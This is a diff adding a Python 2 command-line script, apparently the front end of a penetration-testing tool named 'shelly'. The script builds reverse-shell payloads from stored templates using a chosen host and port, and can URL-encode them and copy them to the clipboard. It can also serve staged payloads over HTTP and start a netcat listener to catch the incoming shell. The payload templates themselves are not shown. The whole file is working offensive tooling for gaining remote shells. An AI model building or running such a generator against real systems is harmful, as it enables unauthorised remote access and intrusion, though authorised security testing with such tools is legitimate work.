@@ -1,0 +1,124 @@
+#!/usr/bin/env python2
+import argparse, argcomplete
+import os
+import pyperclip
+
+from classes import Payload, StagerHTTP, Connector
+
+#Adjust with the correct parameters
+BASE_PATH='/opt/shelly/'
+
+#No need to change it
+REPO_PATH=BASE_PATH+'repo/'
+PAYLOADS_PATH=REPO_PATH+'payloads/'
+STAGERS_PATH=REPO_PATH+'stagers/'
+CONNECTORS_PATH=REPO_PATH+'connectors/'
+
+#reading the dir contents to generate apropiate args and tabcompletion
+PAYLOADS=[]
+STAGERS=[]
+for filename in os.listdir(PAYLOADS_PATH):
+    PAYLOADS.append(filename)
+for filename in os.listdir(STAGERS_PATH):
+    STAGERS.append(filename)
+
+#start argument parsing
+parser = argparse.ArgumentParser(description='Generate payloads in various langs to generate reverse shells.')
+
+#create 2 subparser for two different commands
+subparsers = parser.add_subparsers(help='available commands',dest='command')
+rev_parser = subparsers.add_parser("rev", help="generate reverse shell payload")
+show_parser = subparsers.add_parser("show", help="list info about available payloads, stagers...")
+
+#args for the reverse command
+rev_parser.add_argument("-p","--payload", required=True, choices=PAYLOADS, help="payload to use")
+rev_parser.add_argument("-H","--lhost", help="local host")
+rev_parser.add_argument("-P","--lport", help="local port")
+rev_parser.add_argument("--param1","-1", help="aux. parameter 1")
+rev_parser.add_argument("--param2","-2", help="aux. parameter 2 ")
+rev_parser.add_argument("--stager",choices=STAGERS,help="use an stager to serve the payload")
+rev_parser.add_argument("--sport",default="80",help="stager port")
+rev_parser.add_argument("-l","--listen",help="setup a netcat lstener",action="store_true")
+rev_parser.add_argument("-u","--urlencode",help="urlencode payload",action="store_true")
+
+#args for show command
+subparsers2= show_parser.add_subparsers(dest='command2')
+pay_parser = subparsers2.add_parser("payload")
+sta_parser = subparsers2.add_parser("stager")
+pay_parser.add_argument("payload", choices=PAYLOADS, nargs='?')
+sta_parser.add_argument("stager", choices=STAGERS, nargs='?')
+
+#parsing and enabling bash-completion
+argcomplete.autocomplete(parser)
+args=parser.parse_args()
+
+#getting options in a dict
+#transform to upper because the classes get opts this way
+opts=vars(args)
+clean_opts={}
+for o in opts:
+    if type(opts[o]) is str:
+        clean_opts[o.upper()]=opts[o]
+
+#processing rev (reverse command)
+if args.command=='rev':
+    #creating payload
+    p=Payload(PAYLOADS_PATH+opts['payload'])
+    if not p.generatePayload(clean_opts):
+        #call method to show the required args!!
+        print "Error generating REVERSE payload. Missing args? Check help!"
+        print "MAIN require:", p.requiredOpts()
+        exit()
+
+    if args.urlencode:
+        payload=p.getUrlencoded()
+    else:
+        payload=p.payload
+    #checking if stager is enabled
+    if args.stager:
+        s=StagerHTTP(STAGERS_PATH+args.stager)
+        s.setStagedPayload(p.payload)
+        if not s.generatePayload(clean_opts):
+            print "Error generating STAGER payload. Missing args? Check help!"
+            print "MAIN require:", p.requiredOpts()
+            print "STAGER require:", s.requiredOpts()
+            exit()
+        print "[*] Payload generated:"
+        if args.urlencode: 
+            print s.getUrlencoded()
+            pyperclip.copy(s.getUrlencoded())
+        else: 
+            print s.payload
+            pyperclip.copy(s.payload)
+        #starting the http server to serve staged payload
+        s.serveStaged()
+    #if not staged print the normal payload
+    else:
+        print "[*] Payload generated:"
+        print payload
+        pyperclip.copy(payload)
+
+    #if listener is required we start it now
+    if args.listen:
+        try:
+            c=Connector(CONNECTORS_PATH+p.getConnector())
+            if not c.launch(clean_opts):
+                print "[!] Non available / Configured connectors for this payload"
+        except:
+            print "[!] Error (maybe connector file not present)"
+
+elif args.command2=='payload':
+    if not args.payload:
+        for PAYLOAD in PAYLOADS:
+            print Payload(PAYLOADS_PATH+PAYLOAD).getBrief()
+    else:
+        print Payload(PAYLOADS_PATH+args.payload).getInfo()
+        
+
+elif args.command2=='stager':
+    if not args.stager:
+        for STAGER in STAGERS:
+            print StagerHTTP(STAGERS_PATH+STAGER).getBrief()
+            
+    else:
+        print StagerHTTP(STAGERS_PATH+args.stager).getInfo()
